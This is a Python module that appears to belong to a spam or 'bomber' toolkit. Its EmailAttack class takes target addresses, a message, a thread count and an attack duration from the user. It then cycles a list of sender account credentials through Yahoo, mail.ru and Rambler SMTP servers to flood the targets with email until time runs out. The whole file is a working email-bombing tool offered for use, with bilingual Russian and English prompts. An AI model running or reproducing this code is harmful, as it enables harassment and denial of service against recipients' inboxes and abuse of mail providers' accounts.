import os
import time
import fade
import ctypes
import urllib3
import smtplib
from sys import platform
from datetime import datetime
from email.utils import make_msgid
from threading import Thread, Lock
from email.mime.text import MIMEText
from colorama import Fore, Style, Back, init
from email.mime.multipart import MIMEMultipart
from core.etc.functions import logo_email, get_lang, get_email_accounts

urllib3.disable_warnings()
init()


class EmailAttack:
    def __init__(self):
        self.r = '0'
        self.r2 = '0'
        self.lang = get_lang()
        self.todo = 0
        self.started = 0
        self.lock = Lock()
        self.accounts = get_email_accounts()

    def stat(self):
        if platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 ・ Successs: {self.r}")

        if self.started == self.todo:
            with self.lock:
                if self.lang == 'ru':
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'СТАТУС' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'ОТПРАВЛЕНО: ' + Fore.MAGENTA + self.r + Fore.RED + ' ОШИБКИ: ' + self.r2)
                else:
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'STATUS' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'SENT: ' + Fore.MAGENTA + self.r + Fore.RED + ' FAILS: ' + self.r2)

    def email_thread(self, time_a, targets, message, subject):
        t = time.monotonic()
        while time.monotonic() - t < time_a:
            for account in self.accounts:
                for target in targets:
                    if '@yahoo.com' in account:
                        smtp = 'smtp.mail.yahoo.com'
                    elif '@mail.ru' in account:
                        smtp = 'smtp.mail.ru'
                    elif '@bk.ru' in account:
                        smtp = 'smtp.mail.ru'
                    elif '@inbox.ru' in account:
                        smtp = 'smtp.mail.ru'
                    elif '@list.ru' in account:
                        smtp = 'smtp.mail.ru'
                    elif '@internet.ru' in account:
                        smtp = 'smtp.mail.ru'
                    elif '@payeerbox.ru' in account:
                        smtp = 'smtp.mail.ru'
                    else:
                        smtp = 'smtp.rambler.ru'

                    line = account.split(':')
                    from_email = line[0]
                    from_pas = line[1]

                    try:
                        msg = MIMEMultipart()
                        msg['Message-ID'] = make_msgid()
                        msg['From'] = from_email
                        msg['To'] = target
                        msg['Subject'] = subject
                        msg.attach(MIMEText(message, 'plain'))
                        server = smtplib.SMTP(smtp, 587)
                        server.ehlo()
                        server.starttls()
                        server.ehlo()
                        server.login(msg['From'], from_pas)
                        server.sendmail(msg['From'], msg['To'], msg.as_string())
                        server.quit()
                        self.r = str(int(self.r) + 1)
                        self.stat()
                    except:
                        self.r2 = str(int(self.r2) + 1)
                        self.stat()

    def email_start(self):
        if platform == 'win32':
            os.system("cls")
        else:
            os.system("clear")

        logo_email()

        if self.lang == 'ru':
            text = "\nEmail(ы) для атаки > "
            text2 = """
╔════════════════════════════════════════════╗
║Если вы собираетесь указать несоклько email,║
║    то делайте это в следующем вормате:     ║
║           email, email, email              ║
║                                            ║
║       Формат email: email@email.com        ║
╚════════════════════════════════════════════╝
                    """
            text3 = "Сообщение для отправки > "
            text4 = "Тема сообщения > "
        else:
            text = "\nEmail(s) for the attack > "
            text2 = """
╔══════════════════════════════════════════════╗
║If you are going to enter more than one email,║
║       do it in the following format:         ║
║            email, email, email               ║
║                                              ║
║        Email format: email@email.com         ║
╚══════════════════════════════════════════════╝    
                    """
            text3 = "Message to send > "
            text4 = "Message subject > "

        print(fade.water(text2))

        emails = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN)
        emails = emails.replace(' ', '')
        emails = emails.split(',')
        mes = input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN)
        subject = input(Fore.YELLOW + Style.BRIGHT + text4 + Fore.GREEN)

        if self.lang == 'ru':
            text = 'Потоки > '
            text2 = 'Время атаки (в сек.) > '
            text3 = 'поток запущен'
        else:
            text = 'Threads > '
            text2 = 'Time attack (in sec.) > '
            text3 = 'thread started'

        self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN))
        time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text2 + Fore.GREEN))

        th = None

        for _ in range(self.todo):
            th = Thread(target=self.email_thread, args=(time_attack, emails, mes, subject,))
            th.start()
            self.started += 1
            print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                  Fore.YELLOW + Style.BRIGHT + text3)

        time.sleep(1)

        th.join()
